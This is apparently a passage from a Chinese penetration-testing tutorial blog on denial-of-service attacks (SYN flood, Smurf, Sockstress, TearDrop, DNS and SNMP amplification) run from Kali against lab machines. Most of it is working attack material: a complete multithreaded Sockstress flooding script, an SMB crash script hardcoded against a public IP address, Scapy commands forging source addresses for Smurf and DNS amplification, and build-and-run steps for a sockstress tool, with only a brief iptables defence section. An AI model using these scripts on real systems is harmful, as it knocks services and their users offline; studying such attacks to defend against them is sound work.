<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# python syn_flood.py <span class="number">10.10</span><span class="number">.10</span><span class="number">.141</span> <span class="number">22</span> <span class="number">200</span></span><br><span class="line"># 由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则</span><br><span class="line">iptables -A OUTPUT -p tcp --tcp-flags RST RST -d <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span> -j DROP</span><br></pre></td></tr></table></figure>

<p>抓包发现网络上充满数据包</p>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/8QfyVAU.png" alt="img"></p>
<p>使用 ssh 连接 服务器发现无法响应</p>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/8EWXAt7.png" alt="img"></p>
<p>在服务器使用 top 查看内存占用情况，发现占用极少</p>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/wxcaUbA.png" alt="img"></p>
<p>在服务器查看连接，发现连接数非常多</p>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/sHDzLpP.png" alt="img"></p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">查看 linux 服务器最大 TCP 连接数发现是 <span class="number">255</span> 个</span><br><span class="line">netstat -n | awk <span class="comment">'/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;'</span></span><br></pre></td></tr></table></figure>

<h5 id="2-攻击windows机器"><a href="#2-攻击windows机器" class="headerlink" title="2.攻击windows机器"></a>2.攻击windows机器</h5><p>1.测试可用性</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# rdesktop <span class="number">10.10</span><span class="number">.10</span><span class="number">.141</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/wYUMp3w.png" alt="img"></p>
<p>2.执行脚本</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# python syn_flood.py <span class="number">10.10</span><span class="number">.10</span><span class="number">.141</span> <span class="number">3389</span> <span class="number">10</span></span><br><span class="line"># 由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则</span><br><span class="line">iptables -A OUTPUT -p tcp --tcp-flags RST RST -d <span class="number">10.10</span><span class="number">.10</span><span class="number">.141</span> -j DROP</span><br><span class="line"></span><br><span class="line"><span class="symbol">root@</span>kali:~# rdesktop <span class="number">10.10</span><span class="number">.10</span><span class="number">.141</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/uH5y56U.png" alt="img"></p>
<p>winxp 的最大半开连接数只有 10 个</p>
<h4 id="泛洪攻击常伴随IP地址欺骗"><a href="#泛洪攻击常伴随IP地址欺骗" class="headerlink" title="泛洪攻击常伴随IP地址欺骗"></a>泛洪攻击常伴随IP地址欺骗</h4><p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/OIWj7fT.jpg" alt="img"></p>
<p>伪造源地址为 3.3.3.3，访问许多网站，将响应数据包发送给 3.3.3.3</p>
<ul>
<li>经常用于 DoS 攻击</li>
<li>根据 IP 头地址寻址<ul>
<li>伪造IP源地址</li>
</ul>
</li>
<li>便捷路由器过滤源IP<ul>
<li>入站、出站</li>
</ul>
</li>
<li>受害者可能是源、目的地址</li>
<li>绕过基于地址的验证</li>
<li>压力测试模拟多用户</li>
<li>上层协议（TCP序列号）</li>
</ul>
<h4 id="拒绝服务——Smurf攻击"><a href="#拒绝服务——Smurf攻击" class="headerlink" title="拒绝服务——Smurf攻击"></a>拒绝服务——Smurf攻击</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>向广播地址发送伪造源地址的 ICMP echo Request （ping）包</li>
<li>LAN 所有计算机向伪造源地址返回响应包</li>
<li>对现代操作系统几乎无效（不响应目标为广播的ping）</li>
</ul>
<h5 id="2-测试攻击"><a href="#2-测试攻击" class="headerlink" title="2.测试攻击"></a>2.测试攻击</h5><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; i=IP()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.display()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/G91A6l1.png" alt="img"></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.src=<span class="string">"10.10.10.132"</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.dst=<span class="string">"10.10.10.255"</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/PjqvNVP.png" alt="img"></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; p=ICMP()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; p.display()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/Zr6n0yF.png" alt="img"></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; r=send(i/p)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/mdv0dml.png" alt="img"></p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"># 使用一行发送：</span><br><span class="line">send(<span class="constructor">IP(<span class="params">dst</span>=<span class="string">"10.10.10.255"</span>,<span class="params">src</span>=<span class="string">"10.10.10.132"</span>)</span>/<span class="constructor">ICMP()</span>,count=<span class="number">100</span>,verbose=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="拒绝服务–Sockstress-攻击"><a href="#拒绝服务–Sockstress-攻击" class="headerlink" title="拒绝服务–Sockstress 攻击"></a>拒绝服务–Sockstress 攻击</h3><h4 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
<li>2008年由Jack C.Louis 发现</li>
<li>针对TCP服务的拒绝服务攻击<ul>
<li>消耗被攻击目标系统资源</li>
<li>与攻击目标建立大量socket链接</li>
<li>完成三次握手，最后的ACK包window 大小为0 (客户端不接收数据)</li>
<li>攻击者资源消耗小(CPU、内存、带宽)</li>
<li>异步攻击，单机可拒绝服务高配资源服务器</li>
<li>Window 窗口实现的TCP 流控</li>
</ul>
</li>
</ul>
<h4 id="2-脚本攻击-1"><a href="#2-脚本攻击-1" class="headerlink" title="2.脚本攻击"></a>2.脚本攻击</h4><h5 id="1-python测试脚本"><a href="#1-python测试脚本" class="headerlink" title="1.python测试脚本"></a>1.python测试脚本</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all import*</span><br><span class="line"><span class="keyword">from</span> time import sleep</span><br><span class="line">import thread</span><br><span class="line">import random</span><br><span class="line">import logging</span><br><span class="line">import os</span><br><span class="line">import signal</span><br><span class="line">import sys</span><br><span class="line">import signal</span><br><span class="line"></span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != 4:</span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">"用法: ./sockstress.py [IP地址] [端口] [线程数]"</span></span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">"举例: ../sockstress.py  1.1.1.1 80 20 # 请确定被攻击端口处于开放状态"</span></span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">dstport= int(sys.argv[2])</span><br><span class="line">threads = int(sys.argv[3])</span><br><span class="line"></span><br><span class="line"><span class="comment">## 攻击函数</span></span><br><span class="line">def sockstress(target,dstport) :</span><br><span class="line">    <span class="keyword">while</span> 0 == 0:</span><br><span class="line">        try:</span><br><span class="line">            x = random.randint(0,65535)</span><br><span class="line">            response = sr1(IP(<span class="attribute">dst</span>=target)/TCP(sport=x,dport=dstport,flags = <span class="string">'S'</span>),<span class="attribute">timeout</span>=1,verbose=0)</span><br><span class="line">            send(IP(<span class="attribute">dst</span>=target)/TCP(dport=dstport,sport=x,window=0,lags='A',ack=(response[TCP].seq + 1) )/<span class="string">'\x00\x00'</span>,<span class="attribute">verbose</span>=0)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"><span class="comment">## 停止攻击函数</span></span><br><span class="line">def shutdown(signal,frame):</span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">"正在修复 iptables 规则"</span></span><br><span class="line">    os.system(<span class="string">'iptables -D OUTPUT -p tcp --tcp-flags RST RST -d '</span>+ target +<span class="string">' -j DROP'</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="comment">## 添加iptables规则</span></span><br><span class="line">os.system(<span class="string">'iptables -A OUTPUT -p tcp --tcp-flags RST RST -d '</span>+ target +<span class="string">' -j DROP'</span>)</span><br><span class="line">signal.signal(signal.SIGINT, shutdown)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 多线程攻击</span></span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"\n攻击正在进行...按 Ctrl+C 停止攻击"</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(0,threads):</span><br><span class="line">    thread.start_new_thread(sockstress, (target,dstport))</span><br><span class="line"></span><br><span class="line"><span class="comment">##永远执行</span></span><br><span class="line"><span class="keyword">while</span> 0 == 0:</span><br><span class="line">    sleep(1)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>测试结果</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看系统连接数</span></span><br><span class="line">netstat |<span class="string"> grep ESTABLISHED </span>|<span class="string"> wc -l</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/zdOuFdq.png" alt="img"></p>
<h5 id="2-C攻击脚本"><a href="#2-C攻击脚本" class="headerlink" title="2.C攻击脚本"></a>2.C攻击脚本</h5><ul>
<li>下载编译</li>
</ul>
<p><a href="https://github.com/defuse/sockstress" target="_blank" rel="noopener">github 下载地址</a></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">gcc -Wall -c sockstress.c</span><br><span class="line">gcc -pthread -o sockstress sockstress.o</span><br><span class="line">./sockstress <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span>:<span class="number">80</span> eth0</span><br><span class="line">./sockstress <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span>:<span class="number">80</span> eth0 -p payloads/http</span><br><span class="line"></span><br><span class="line">防火墙规则</span><br><span class="line">iptables -A OUTPUT -p TCP --tcp-flags rst rst -d <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span> -j DROP</span><br></pre></td></tr></table></figure>

<ul>
<li><p>查看攻击效果</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">netstat -tulnp | <span class="type">grep</span> ESTABLISHED | <span class="type">wc</span> -l</span><br><span class="line">free</span><br><span class="line"><span class="built_in">top</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="3-防御措施"><a href="#3-防御措施" class="headerlink" title="3.防御措施"></a>3.防御措施</h4><ul>
<li>直到今天sockstress攻击仍然是一种很有效的DOS攻击方式</li>
<li>由于建立完整的TCP三步握手，因此使用syn cookie防御无效</li>
<li>根本的防御方法是采用白名单(不实际)</li>
<li>折中对策限制单位时间内每IP建的TCP连接数<ul>
<li>封杀每30秒与 80 端口建立连接超过 10 个的IP地址</li>
<li>iptables -I INPUT -p tcp –dport 80 -m state–state NEW -m recent–set</li>
<li>iptables -I INPUT-p tcp -dport 80 -m state-state NEW-m recent -update–seconds 30 -hitcount 10 j DROP</li>
<li>以上规则对DDOS攻击无效</li>
</ul>
</li>
</ul>
<h3 id="拒绝服务–TearDrop-攻击"><a href="#拒绝服务–TearDrop-攻击" class="headerlink" title="拒绝服务–TearDrop 攻击"></a>拒绝服务–TearDrop 攻击</h3><h4 id="1-简介-2"><a href="#1-简介-2" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
<li>主要针对早期微软操作系统（95、98、3.x、nt）<ul>
<li>近些年有人发现对 2.x 版本的安卓系统、6.0 IOS 系统攻击有效</li>
</ul>
</li>
<li>原理很有趣<ul>
<li>使用 IP 分段便宜实现分段覆盖，接收端处理分段覆盖时可被拒绝服务</li>
</ul>
</li>
<li>攻击效果<ul>
<li>被攻击者蓝屏、重启、卡死</li>
</ul>
</li>
</ul>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/w9pzlfZ.png" alt="img"></p>
<ul>
<li>Ping大包，比较正常分段与teardrop攻击流量的区别</li>
<li>针对早期windows系统SMB协议的攻击<ul>
<li>teardrop_smb.py</li>
</ul>
</li>
<li>针对Android.IOS 系统的攻击<ul>
<li>teardrop_androidios.py</li>
</ul>
</li>
<li>攻击向量并不确定，要视具体协议分析</li>
</ul>
<h4 id="2-攻击目标"><a href="#2-攻击目标" class="headerlink" title="2.攻击目标"></a>2.攻击目标</h4><p>泪滴攻击是一种拒绝服务（DoS）攻击，涉及将碎片数据包发送到目标机器。由于接收这些数据包的机器由于TCP / IP碎片重组错误而无法重新组装，因此数据包相互重叠，导致目标网络设备崩溃。这通常发生在较早的操作系统上，例如Windows 3.1x，Windows 95，Windows NT和2.1.63之前版本的Linux内核。</p>
<p>IP报头中的一个字段是“片段偏移量”字段，指示包含在分段数据包中的数据相对于原始数据包中的数据的起始位置或偏移量。如果一个分片数据包的偏移量和大小之和不同于下一个分片数据包的偏移量和大小之和，则数据包重叠。发生这种情况时，易受泪滴攻击的服务器无法重新组装数据包 - 从而导致拒绝服务状况。</p>
<h4 id="3-攻击脚本"><a href="#3-攻击脚本" class="headerlink" title="3.攻击脚本"></a>3.攻击脚本</h4><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># When SMB2.0 recieve a "&amp;" char in the "Process Id High"</span><br><span class="line"># SMB header field it dies with a</span><br><span class="line"># PAGE_FAULT_IN_NONPAGED_AREA</span><br><span class="line"># filename: teardrop-attack-smb.py</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from socket import socket</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">#host = sys.argv[1], 445</span><br><span class="line">#host = "192.168.33.13", 445</span><br><span class="line">host = "217.113.205.53", 445</span><br><span class="line">buff = (</span><br><span class="line">"<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>90" # Begin SMB header: Session message</span><br><span class="line">"<span class="symbol">\x</span>ff<span class="symbol">\x</span>53<span class="symbol">\x</span>4d<span class="symbol">\x</span>42" # Server Component: SMB</span><br><span class="line">"<span class="symbol">\x</span>72<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00" # Negociate Protocol</span><br><span class="line">"<span class="symbol">\x</span>00<span class="symbol">\x</span>18<span class="symbol">\x</span>53<span class="symbol">\x</span>c8" # Operation 0x18 &amp; sub 0xc853</span><br><span class="line">"<span class="symbol">\x</span>00<span class="symbol">\x</span>26"# Process ID High: --&gt; :) normal value should be "<span class="symbol">\x</span>00<span class="symbol">\x</span>00"</span><br><span class="line">"<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>fe"</span><br><span class="line">"<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>6d<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>50<span class="symbol">\x</span>43<span class="symbol">\x</span>20<span class="symbol">\x</span>4e<span class="symbol">\x</span>45<span class="symbol">\x</span>54"</span><br><span class="line">"<span class="symbol">\x</span>57<span class="symbol">\x</span>4f<span class="symbol">\x</span>52<span class="symbol">\x</span>4b<span class="symbol">\x</span>20<span class="symbol">\x</span>50<span class="symbol">\x</span>52<span class="symbol">\x</span>4f<span class="symbol">\x</span>47<span class="symbol">\x</span>52<span class="symbol">\x</span>41<span class="symbol">\x</span>4d<span class="symbol">\x</span>20<span class="symbol">\x</span>31"</span><br><span class="line">"<span class="symbol">\x</span>2e<span class="symbol">\x</span>30<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>4c<span class="symbol">\x</span>41<span class="symbol">\x</span>4e<span class="symbol">\x</span>4d<span class="symbol">\x</span>41<span class="symbol">\x</span>4e<span class="symbol">\x</span>31<span class="symbol">\x</span>2e<span class="symbol">\x</span>30<span class="symbol">\x</span>00"</span><br><span class="line">"<span class="symbol">\x</span>02<span class="symbol">\x</span>57<span class="symbol">\x</span>69<span class="symbol">\x</span>6e<span class="symbol">\x</span>64<span class="symbol">\x</span>6f<span class="symbol">\x</span>77<span class="symbol">\x</span>73<span class="symbol">\x</span>20<span class="symbol">\x</span>66<span class="symbol">\x</span>6f<span class="symbol">\x</span>72<span class="symbol">\x</span>20<span class="symbol">\x</span>57"</span><br><span class="line">"<span class="symbol">\x</span>6f<span class="symbol">\x</span>72<span class="symbol">\x</span>6b<span class="symbol">\x</span>67<span class="symbol">\x</span>72<span class="symbol">\x</span>6f<span class="symbol">\x</span>75<span class="symbol">\x</span>70<span class="symbol">\x</span>73<span class="symbol">\x</span>20<span class="symbol">\x</span>33<span class="symbol">\x</span>2e<span class="symbol">\x</span>31<span class="symbol">\x</span>61"</span><br><span class="line">"<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>4c<span class="symbol">\x</span>4d<span class="symbol">\x</span>31<span class="symbol">\x</span>2e<span class="symbol">\x</span>32<span class="symbol">\x</span>58<span class="symbol">\x</span>30<span class="symbol">\x</span>30<span class="symbol">\x</span>32<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>4c"</span><br><span class="line">"<span class="symbol">\x</span>41<span class="symbol">\x</span>4e<span class="symbol">\x</span>4d<span class="symbol">\x</span>41<span class="symbol">\x</span>4e<span class="symbol">\x</span>32<span class="symbol">\x</span>2e<span class="symbol">\x</span>31<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>4e<span class="symbol">\x</span>54<span class="symbol">\x</span>20<span class="symbol">\x</span>4c"</span><br><span class="line">"<span class="symbol">\x</span>4d<span class="symbol">\x</span>20<span class="symbol">\x</span>30<span class="symbol">\x</span>2e<span class="symbol">\x</span>31<span class="symbol">\x</span>32<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>53<span class="symbol">\x</span>4d<span class="symbol">\x</span>42<span class="symbol">\x</span>20<span class="symbol">\x</span>32<span class="symbol">\x</span>2e"</span><br><span class="line">"<span class="symbol">\x</span>30<span class="symbol">\x</span>30<span class="symbol">\x</span>32<span class="symbol">\x</span>00"</span><br><span class="line">)</span><br><span class="line">s = socket()</span><br><span class="line">s.connect(host)</span><br><span class="line">s.send(buff)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<h4 id="拒绝服务–DNS-放大攻击"><a href="#拒绝服务–DNS-放大攻击" class="headerlink" title="拒绝服务–DNS 放大攻击"></a>拒绝服务–DNS 放大攻击</h4><h4 id="1-简介-3"><a href="#1-简介-3" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
<li>产生大流量的攻击方法<ul>
<li>单机的带宽优势</li>
<li>巨大单机数量形成的流量汇聚</li>
<li>利用协议特性实现放大效果的流量</li>
</ul>
</li>
<li>DNS协议放大效果<ul>
<li>查询请求流量小，但响应流量可能非常巨大</li>
<li>dig ANY hp.com @202 106.0.20 (流量放大约8倍)</li>
</ul>
</li>
<li>攻击原理<ul>
<li>伪造源地址为被攻击目标地址，向递归域名查询服务器发起查询</li>
<li>DNS服务器成为流量放大和实施攻击者，大量DNS服务器实现DDOS</li>
</ul>
</li>
</ul>
<h4 id="2-攻击"><a href="#2-攻击" class="headerlink" title="2.攻击"></a>2.攻击</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# dig any baidu.com @<span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span></span><br></pre></td></tr></table></figure>

<p>发送60字节长度，返回216字节长度</p>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/GqPGP9F.png" alt="img"></p>
<h4 id="3-Scapy构造攻击数据包原理"><a href="#3-Scapy构造攻击数据包原理" class="headerlink" title="3.Scapy构造攻击数据包原理"></a>3.Scapy构造攻击数据包原理</h4><ul>
<li>IP/UDP/DNS/DNS 查询内容</li>
</ul>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/px5Ihn0.png" alt="img"></p>
<ul>
<li>结合IP地址欺骗，利用大量 DNS 服务器做傀儡攻击目标</li>
</ul>
<h4 id="4-构造数据包过程"><a href="#4-构造数据包过程" class="headerlink" title="4.构造数据包过程"></a>4.构造数据包过程</h4><p>1.构造 IP 数据包</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; i=IP()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.display()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/z1OV3Jv.png" alt="img"></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.dst=<span class="string">"114.114.114.114"</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.display()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/3MXZboo.png" alt="img"></p>
<p>2.构造UDP数据包</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; u=UDP()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; u.display()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/14c4SzU.png" alt="img"></p>
<p>3.构造 DNS 数据包</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; d=DNS()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; d.display()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/aZfTrYu.png" alt="img"></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; d.rd=<span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; d.qdcount=<span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; d.display()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/aBZdHNP.png" alt="img"></p>
<p>4.设置查询目标</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; q=DNSQR()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; q.display()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/qcAPHGS.png" alt="img"></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; q.qname=<span class="string">'qq.com'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; q.qtype=<span class="number">255</span>   <span class="comment">#（代表any）</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/DiDX3Nk.png" alt="img"></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; d.qd=q   <span class="comment"># 设置目标</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; d.display()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/ucWhz05.png" alt="img"></p>
<p>5.拼接数据包</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; r=(i/u/d)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; r</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/BYH2G1x.png" alt="img"></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; r.display()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; sr1(r)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/mjWweAd.png" alt="img"></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.src=<span class="string">"10.10.10.141"</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; r=(i/u/d)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; r.display()</span><br></pre></td></tr></table></figure>

<p>6.发送数据包</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; send(r)</span><br></pre></td></tr></table></figure>

<p>发送 60 字节的数据包，返回 2；l30 字节的数据包</p>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/j8EXlRY.png" alt="img"></p>
<h3 id="拒绝服务——SNMP服务"><a href="#拒绝服务——SNMP服务" class="headerlink" title="拒绝服务——SNMP服务"></a>拒绝服务——SNMP服务</h3><h4 id="1-简介-4"><a href="#1-简介-4" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
<li>简单网络管理协议</li>
<li>Simmple Network Management Protocol<ul>
<li>一般用来监控和管理网络设备</li>
</ul>
</li>
<li>服务端口UDP 161/162<ul>
<li>管理站(manager/客户端)、被管理设备(agent/服务端)</li>
<li>管理信息数据库(MIB) 是一个信息存储库，包含管理代理中的有关配置和性能的数据，按照不同分类，包含分属不同组的多个数据对象</li>
<li>每一个节点都有一个对象标识符(OID) 来唯一的标识一IETF定义便准的MIB库厂家自定义MIB库</li>
</ul>
</li>
<li>攻击原理</li>
<li>请求流量小，查询结果返回流量大<ul>
<li>结合伪造源地址实现攻击</li>
</ul>
</li>
</ul>
<h4 id="2-安装SNMP"><a href="#2-安装SNMP" class="headerlink" title="2.安装SNMP"></a>2.安装SNMP</h4><ul>
<li>安装 SNMP，定义 community</li>
</ul>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/okOSYrp.png" alt="img"></p>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/TZf6kGU.png" alt="img"></p>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/aH8IJJ2.png" alt="img"></p>
<h4 id="3-scapy构造数据包"><a href="#3-scapy构造数据包" class="headerlink" title="3.scapy构造数据包"></a>3.scapy构造数据包</h4><ul>
<li>流程</li>
</ul>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/28X1RdW.png" alt="img"></p>
<ul>
<li>步骤</li>
</ul>
<p><strong>构造 IP 数据包</strong></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; i=IP()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.dst=<span class="string">"10.10.10.142"</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.display()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/mDZkeVN.png" alt="img"></p>
<p><strong>构造 UDP 数据包</strong></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; u=UDP()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; u.dport=<span class="number">161</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; u.sport=<span class="number">161</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/wq7hyEF.png" alt="img"></p>
<p><strong>构造 SNMP 数据包</strong></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; s=SNMP()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/LGtwfwK.png" alt="img"></p>
<p><strong>设置放大倍数</strong></p>
